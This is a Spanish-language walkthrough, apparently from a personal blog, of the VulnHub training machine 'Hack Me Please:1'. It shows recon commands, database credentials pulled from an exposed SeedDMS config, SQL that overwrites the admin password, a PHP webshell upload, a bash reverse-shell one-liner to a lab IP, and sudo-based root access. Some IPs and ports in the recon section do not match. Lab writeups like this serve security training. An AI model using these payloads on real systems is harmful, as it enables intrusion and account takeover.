---
layout: single
title: Hack Me Please:1 - VulnHub
excerpt: " Difficulty: Easy

Description: An easy box totally made for OSCP. No bruteforce is required.

Aim: To get root shell "
date: 2022-12-11
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-hackmeplease/hackmeplease.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:  
  - mysql
  - seeddms
  - php
  - sudoer
---

Difficulty: Easy

Description: An easy box totally made for OSCP. No bruteforce is required.

Aim: To get root shell

# Summary
- IP: 192.168.0.115
- Ports: 80,3306,33060
- OS: Linux (Ubuntu Focal)
- Services & Applications:
	-  80-> Apache httpd 2.4.41
	-  3306 -> MySQL 8.0.25-0ubuntu0.20.04.1
	-  33060 -> mysqlx?

# Recon

- Escaneo básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.129.26 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$sudo nmap -p21,3306,33060 -sCV 10.10.129.26 -oN targeted
```

- Escaneo de directorios con gobuster:

```bash
$gobuster dir -u 192.168.1.40 -w /home/dante/SecLists/Discovery/Web-Content/common.txt -t 200
```

- No encontramos ningún directorio interesante, así que procedemos a examinar la página web; dentro de la página web analizamos el código fuente, encontramos un recurso "main.js", lo analizamos para encontrar alguna posible fuga en el código; en una linea encontramos lo siguiente:

```js
//make sure this js file is same as installed app on our server endpoint: /seeddms51x/seeddms-5.1.22/
```

- Accedemos al directorio mencionado en el anterior comentario y encontramos una página "SeedDMS" con un login, intentamos acceder con credenciales por defecto sin resultado.

- Hacemos una búsqueda en google para verificar si se trata de un programa opensource:

```
SeedDMS github
```

- Enumeramos los posibles directorios que contiene dicho programa, específicamente existe un directorio "/conf" en el cual hay un archivo ".htacces" el cual advierte la sanitización del archivo "/conf/settings.xml".

- Intentamos abrir este archivo "settings.xml" en caso de que no esté sanitizado y efectivamente tenemos acceso a este archivo, enumeramos información relevante.

- Encontramos credenciales de base de datos: user="seeddms" pass="seeddms", como el puerto 3306 está abierto, intentamos acceder con esta información:

```bash
$mysql -h 192.168.1.40 -useeddms -pseeddms
```

- Buscamos información sensible:

```bash
show databases;
use seeddms;
show tables
select * from users;
```

- Encontramos la credencial para el usuario "saket", intentamos logearnos en la página principal pero no funciona, guardamos esta información y seguimos buscando posibles contraseñas:

```bash
select * from tblUsers
```

- Encontramos al usuario "admin" con su respectiva contraseña hasheada; updateamos la contraseña a una que nosotros conozcamos, al tener 32 caracteres, podría tratarse de un hash MD5, así que creamos una:

```bash
echo -n "hola" l md5sum
```

- Updateamos la celda en la base de datos:

```bash
update tblUsers set pwd='4d186321c1a7f0f354b297e8914ab240' where login='admin';
```

- Ahora accedemos en la página principal de "SeedDMS" como el usuario "admin" y la contraseña que creamos.

- Buscamos vulnerabilidades para "SeedDMS" y encontramos un RCE, analizamos el exploit:

```
Step 1: Login to the application and under any folder add a document.
Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
Step 3: Now after uploading the file check the document id corresponding to the document.
Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.
```


- Creamos un archivo php con una reverse shell y la subimos:

```bash
nano shell.php
```


```bash
<?php
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

- Ahora vemos la id del archivo que acabamos de subir y accedemos mediante el directorio que nos indica el exploit, confirmando el RCE:

```
http://192.168.1.40/seeddms51x/data/1048576/7/1.php?cmd=whoami
```

- Creamos una reverse shell básica:

```bash
bash -c "bash -i >%26 /dev/tcp/192.168.1.31/443 0>%261"
```

- Hacemos tratamiento de TTY y habremos accedido como el usuario "www-data".


# ESCALANDO PRIVILEGIOS:


- Recordamos la credencial del usuario "soket" que habíamos encontrado anteriormente, la usamos para intentar pivotar de usuario y sí que funciona.

```bash
su saket
```

- Vemos permisos de sudoers ( sudo -l ) y encontramos que el usuario saket tiene permitido ejecutar como root cualquier binario:

```bash
User saket may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

- Accedemos como superusuario con sudo y seremos root:

```bash
sudo su
```
